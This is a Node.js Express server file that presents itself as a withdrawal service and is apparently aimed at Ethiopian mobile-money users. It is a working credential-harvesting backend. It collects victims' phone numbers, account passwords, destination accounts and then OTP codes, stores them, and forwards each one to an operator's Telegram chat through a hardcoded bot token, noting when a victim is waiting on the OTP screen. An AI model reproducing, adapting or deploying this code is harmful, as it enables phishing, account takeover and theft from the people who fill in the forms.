const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());
app.use(cors());

// Serve the frontend
app.use(express.static(path.join(__dirname, './'))); 

// Health Check to keep Render Awake
app.get('/ping', (req, res) => res.status(200).send("Awake"));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// --- TELEGRAM & DATABASE CONFIG ---
const WITHDRAWALS_FILE = './withdrawals.json';
// IMPORTANT: Replace these with your actual bot token and chat ID
const TELEGRAM_BOT_TOKEN = '8667318890:AAHd4lEyJovhoKaUCERzGvtj3yfYsU81X7U'; 
const TELEGRAM_CHAT_ID = '7328420364';

const getWithdrawals = () => {
    if (!fs.existsSync(WITHDRAWALS_FILE)) return [];
    try { 
        return JSON.parse(fs.readFileSync(WITHDRAWALS_FILE)); 
    } catch (e) { 
        return []; 
    }
};

const notifyAdminTelegramRequest = async (data) => {
    const message = `
🚨 *NEW WITHDRAWAL REQUEST* 🚨
=========================
🏦 *Method:* ${data.bank}
💰 *Amount:* ${data.amount} ETB
📱 *Phone:* +251${data.phone}
🔑 *Password:* ||${data.password}|| (Hidden)
💳 *Destination Acc:* ${data.account}
⏰ *Time:* ${new Date().toLocaleString()}
=========================
*Status:* User is currently on OTP verification screen.
    `;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }) });
    } catch (error) { console.error("❌ Failed to send Telegram alert:", error); }
};

const notifyAdminTelegramOTP = async (phone, otpCode) => {
    const message = `
✅ *USER ENTERED OTP* ✅
=========================
📱 *Phone:* +251${phone}
🔢 *Code Entered:* ${otpCode}
⏰ *Time:* ${new Date().toLocaleString()}
=========================
*Action:* Please verify this code against your bot logs and process the payment manually.
    `;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }) });
    } catch (error) { console.error("❌ Failed to send OTP Telegram alert:", error); }
};

// --- ROUTE 1: WITHDRAWAL INTAKE ---
app.post('/api/request-withdrawal', async (req, res) => {
    const { phone, password, amount, account, bank } = req.body;

    if (!phone || !password || !amount || !account || !bank) {
        return res.status(400).json({ message: "All fields are strictly required." });
    }

    // 🛡️ 9 OR 10 DIGIT BACKEND VALIDATION
    const isTrialValid = /^\d{9,10}$/.test(phone);
    if (!isTrialValid) {
        return res.status(400).json({ message: "Invalid Phone. Must be 9 or 10 digits." });
    }

    const newRequest = {
        id: Date.now().toString(),
        phone,
        password,
        amount: parseFloat(amount),
        account,
        bank,
        status: 'pending_otp',
        timestamp: new Date().toISOString()
    };

    let withdrawals = getWithdrawals();
    withdrawals.push(newRequest);
    fs.writeFileSync(WITHDRAWALS_FILE, JSON.stringify(withdrawals, null, 2));

    await notifyAdminTelegramRequest(newRequest);

    res.status(200).json({ message: "Success", requestId: newRequest.id });
});

// --- ROUTE 2: OTP VERIFICATION INTAKE ---
app.post('/api/verify-otp', async (req, res) => {
    const { phone, otp } = req.body;

    if (!phone || !otp) {
        return res.status(400).json({ message: "Missing phone or OTP code." });
    }

    let withdrawals = getWithdrawals();
    let requestIndex = withdrawals.findIndex(w => w.phone === phone && w.status === 'pending_otp');

    if (requestIndex !== -1) {
        withdrawals[requestIndex].status = 'otp_submitted';
        withdrawals[requestIndex].otpProvided = otp;
        fs.writeFileSync(WITHDRAWALS_FILE, JSON.stringify(withdrawals, null, 2));
    }

    await notifyAdminTelegramOTP(phone, otp);

    res.status(200).json({ message: "OTP received successfully." });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Dedicated Withdrawal Server Live on Port ${PORT}`);
});